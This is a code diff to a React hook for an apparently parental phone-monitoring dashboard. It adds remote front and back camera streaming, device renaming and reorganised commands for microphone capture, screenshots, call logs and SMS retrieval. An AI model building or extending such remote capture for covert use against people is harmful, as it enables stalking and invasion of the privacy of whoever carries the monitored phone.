@@ -9,13 +9,14 @@ export function useSocket(token) {
   const audioCtxRef = useRef(null)
   const [connected, setConnected] = useState(false)
   const [devices, setDevices] = useState({})
-  const [cameraFrames, setCameraFrames] = useState({})
+  const [deviceNames, setDeviceNames] = useState({})       // deviceId -> custom name
+  const [cameraFrames, setCameraFrames] = useState({})     // deviceId -> { front, back }
   const [micActive, setMicActive] = useState({})
   const [deviceInfos, setDeviceInfos] = useState({})
   const [batteries, setBatteries] = useState({})
   const [callLogs, setCallLogs] = useState({})
   const [smsMessages, setSmsMessages] = useState({})
-  const [screenshots, setScreenshots] = useState({}) // deviceId -> last saved info
+  const [screenshots, setScreenshots] = useState({})
 
   useEffect(() => {
     if (!token) return
@@ -23,27 +24,38 @@ export function useSocket(token) {
     axios
       .get(`${SERVER_URL}/api/devices`, { headers: { Authorization: `Bearer ${token}` } })
       .then(res => {
-        const map = {}
+        const devMap = {}
+        const nameMap = {}
         res.data.forEach(d => {
-          map[d.deviceId] = d
+          devMap[d.deviceId] = d
+          if (d.name) nameMap[d.deviceId] = d.name
           if (d.info) setDeviceInfos(prev => ({ ...prev, [d.deviceId]: d.info }))
           if (d.battery) setBatteries(prev => ({ ...prev, [d.deviceId]: d.battery }))
         })
-        setDevices(map)
+        setDevices(devMap)
+        setDeviceNames(nameMap)
       })
       .catch(() => {})
 
     const socket = io(SERVER_URL, { query: { role: 'parent' } })
     socketRef.current = socket
 
-    socket.on('connect', () => setConnected(true))
+    socket.on('connect',    () => setConnected(true))
     socket.on('disconnect', () => setConnected(false))
 
     socket.on('device:status', ({ deviceId, online }) =>
       setDevices(prev => ({ ...prev, [deviceId]: { ...prev[deviceId], deviceId, online } })))
 
-    socket.on('camera:frame', ({ deviceId, frame }) =>
-      setCameraFrames(prev => ({ ...prev, [deviceId]: frame })))
+    socket.on('device:name', ({ deviceId, name }) =>
+      setDeviceNames(prev => ({ ...prev, [deviceId]: name })))
+
+    socket.on('camera:frame', ({ deviceId, frame, cameraType }) => {
+      const type = cameraType || 'front'
+      setCameraFrames(prev => ({
+        ...prev,
+        [deviceId]: { ...prev[deviceId], [type]: frame },
+      }))
+    })
 
     socket.on('mic:state', ({ deviceId, active }) =>
       setMicActive(prev => ({ ...prev, [deviceId]: active })))
@@ -59,11 +71,8 @@ export function useSocket(token) {
     socket.on('battery:update', ({ deviceId, level, charging }) =>
       setBatteries(prev => ({ ...prev, [deviceId]: { level, charging } })))
 
-    socket.on('call:logs', ({ deviceId, logs }) =>
-      setCallLogs(prev => ({ ...prev, [deviceId]: logs })))
-
-    socket.on('sms:messages', ({ deviceId, messages }) =>
-      setSmsMessages(prev => ({ ...prev, [deviceId]: messages })))
+    socket.on('call:logs',    ({ deviceId, logs })     => setCallLogs(prev => ({ ...prev, [deviceId]: logs })))
+    socket.on('sms:messages', ({ deviceId, messages }) => setSmsMessages(prev => ({ ...prev, [deviceId]: messages })))
 
     socket.on('screenshot:saved', ({ deviceId, filename, filepath, timestamp }) =>
       setScreenshots(prev => ({ ...prev, [deviceId]: { filename, filepath, timestamp } })))
@@ -111,19 +120,31 @@ export function useSocket(token) {
 
   const emit = (event, data) => socketRef.current?.emit(event, data)
 
-  const cameraStart  = useCallback((deviceId) => emit('cmd:camera:start',  { deviceId }), [])
-  const cameraStop   = useCallback((deviceId) => emit('cmd:camera:stop',   { deviceId }), [])
-  const micOn        = useCallback((deviceId) => emit('cmd:mic:on',        { deviceId }), [])
-  const micOff       = useCallback((deviceId) => emit('cmd:mic:off',       { deviceId }), [])
-  const speak        = useCallback((deviceId, audioData) => emit('cmd:speak', { deviceId, audioData }), [])
-  const takeScreenshot = useCallback((deviceId) => emit('cmd:screenshot',   { deviceId }), [])
-  const getCallLogs  = useCallback((deviceId) => emit('cmd:get:calllogs',  { deviceId }), [])
-  const getSMS       = useCallback((deviceId) => emit('cmd:get:sms',       { deviceId }), [])
+  const cameraStartFront = useCallback((deviceId) => emit('cmd:camera:start:front', { deviceId }), [])
+  const cameraStartBack  = useCallback((deviceId) => emit('cmd:camera:start:back',  { deviceId }), [])
+  const cameraStopFront  = useCallback((deviceId) => emit('cmd:camera:stop:front',  { deviceId }), [])
+  const cameraStopBack   = useCallback((deviceId) => emit('cmd:camera:stop:back',   { deviceId }), [])
+  const micOn            = useCallback((deviceId) => emit('cmd:mic:on',             { deviceId }), [])
+  const micOff           = useCallback((deviceId) => emit('cmd:mic:off',            { deviceId }), [])
+  const speak            = useCallback((deviceId, audioData) => emit('cmd:speak',   { deviceId, audioData }), [])
+  const takeScreenshot   = useCallback((deviceId) => emit('cmd:screenshot',         { deviceId }), [])
+  const getCallLogs      = useCallback((deviceId) => emit('cmd:get:calllogs',       { deviceId }), [])
+  const getSMS           = useCallback((deviceId) => emit('cmd:get:sms',            { deviceId }), [])
+
+  const renameDevice = useCallback(async (deviceId, name) => {
+    try {
+      await axios.put(
+        `${SERVER_URL}/api/devices/${deviceId}/name`,
+        { name },
+        { headers: { Authorization: `Bearer ${token}` } }
+      )
+    } catch { /* ignore */ }
+  }, [token])
 
   return {
-    connected, devices, cameraFrames, micActive,
+    connected, devices, deviceNames, cameraFrames, micActive,
     deviceInfos, batteries, callLogs, smsMessages, screenshots,
-    cameraStart, cameraStop, micOn, micOff, speak,
-    takeScreenshot, getCallLogs, getSMS,
+    cameraStartFront, cameraStartBack, cameraStopFront, cameraStopBack,
+    micOn, micOff, speak, takeScreenshot, getCallLogs, getSMS, renameDevice,
   }
 }
